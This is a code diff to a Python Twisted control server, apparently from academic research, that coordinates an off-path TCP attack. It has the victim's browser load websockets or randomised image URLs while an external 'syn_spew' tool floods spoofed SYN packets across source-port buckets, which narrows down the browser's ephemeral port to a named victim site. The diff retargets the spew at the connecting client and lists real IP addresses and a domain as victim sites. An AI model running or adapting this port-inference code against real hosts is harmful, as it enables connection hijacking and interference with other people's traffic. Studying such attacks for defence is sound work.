@@ -11,6 +11,7 @@ import os
 import signal
 import subprocess
 import time
+import random
 
 class WebSocketServerFactory(Factory):
     """
@@ -33,12 +34,22 @@ class WebSocketServerFactory(Factory):
         return p
 
 
-NUM_BUCKETS = 20
+NUM_BUCKETS = 50
 LOW_PORT = 32768
 HIGH_PORT = 61000
+LOW_PORT = 37500
+HIGH_PORT = 38500
+
 PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / NUM_BUCKETS
 TEST_VICTIM_IP = '192.168.1.113'
-VICTIM_SITE = '66.220.149.11'
+#VICTIM_SITE = '66.220.149.11'  # can't use non-umich because merit egress filters
+#VICTIM_SITE = '141.212.109.163' # can't use things with -m state --state ESTABLISHED,RELATED, because it will send RST to SYN-ACK
+#VICTIM_SITE = '141.212.113.142' # sorry, cse.umich.edu
+VICTIM_SITE = '68.40.51.184' # hobocomp.com! (only usable when victim browser is on umich campus due to merit egress filters)
+VICTIM_SITE_IMG = 'http://%d-x-%d.hobocomp.com/'
+NEW_CONNECTION_PERIOD = 1.0
+CONNECTION_TIMEOUT = 30.0
+SPEW_DELAY_US = '1000'
 
 class ControlWebSocket(Protocol):
     """
@@ -68,7 +79,7 @@ class ControlWebSocket(Protocol):
         #subprocess.call(['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
         #                 '-r', '100', '-d', '100', self.addr.host, '69.171.242.11:80'])
         os.execvp('./syn_spew', ['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
-                                '-r', '0', '-d', '100', TEST_VICTIM_IP, '%s:80' % (VICTIM_SITE)])
+                                '-r', '0', '-d', SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
         #sys.exit(0)
 
 
@@ -124,7 +135,7 @@ class ControlWebSocket(Protocol):
 
     def cleanupOldWebsocket(self):
         subprocess.call(['./syn_spew', '-R', '-p', '%d-%d' % (self.min_port, self.mid_port), \
-                         '-r', '3', '-d', '100', TEST_VICTIM_IP, '%s:80' % (VICTIM_SITE)])
+                         '-r', '3', '-d', SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
         print 'done'
 
         if self.bucket_search:
@@ -136,7 +147,7 @@ class ControlWebSocket(Protocol):
         else:
             self.adjustBucket(True)
         
-        reactor.callLater(0.1, self.fireAgain)
+        reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
  
 
     def websocketTimeout(self):
@@ -151,9 +162,9 @@ class ControlWebSocket(Protocol):
             os.kill(self.spewer_pid, signal.SIGKILL)
             self.spewer_pid = None
 
-        self.transport.write("kill") # kill the current websocket, so that it will try to make a new one in a bit
+        #self.transport.write("kill") # kill the current websocket, so that it will try to make a new one in a bit
 
-        reactor.callLater(0.2, self.cleanupOldWebsocket)
+        reactor.callLater(NEW_CONNECTION_PERIOD, self.cleanupOldWebsocket)
        
 
     def fireAgain(self):
@@ -172,10 +183,11 @@ class ControlWebSocket(Protocol):
         if self.bucket_search:
             testing = "(bucket) testing"
         self.transport.write("show <b>%s %d - %d...</b>" % (testing, self.min_port, self.mid_port))
-        self.transport.write("make ws://%s/" % (VICTIM_SITE)) 
+        #self.transport.write("make ws://%s/" % (VICTIM_SITE)) 
+        self.transport.write("img %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy.
 
         self.fire_time = time.time()
-        self.websocketTimeoutCb = reactor.callLater(1, self.websocketTimeout)
+        self.websocketTimeoutCb = reactor.callLater(CONNECTION_TIMEOUT, self.websocketTimeout)
         
 
     def dataReceived(self, data):
@@ -203,8 +215,7 @@ class ControlWebSocket(Protocol):
             if not(self.bucket_search):
                 self.adjustBucket(False) # The browser's source port was NOT in this bucket
 
-            print 'close calling fireAgain in 0.2...'
-            reactor.callLater(0.2, self.fireAgain)
+            reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
 
     def connectionMade(self):
         self.bucket_search = True
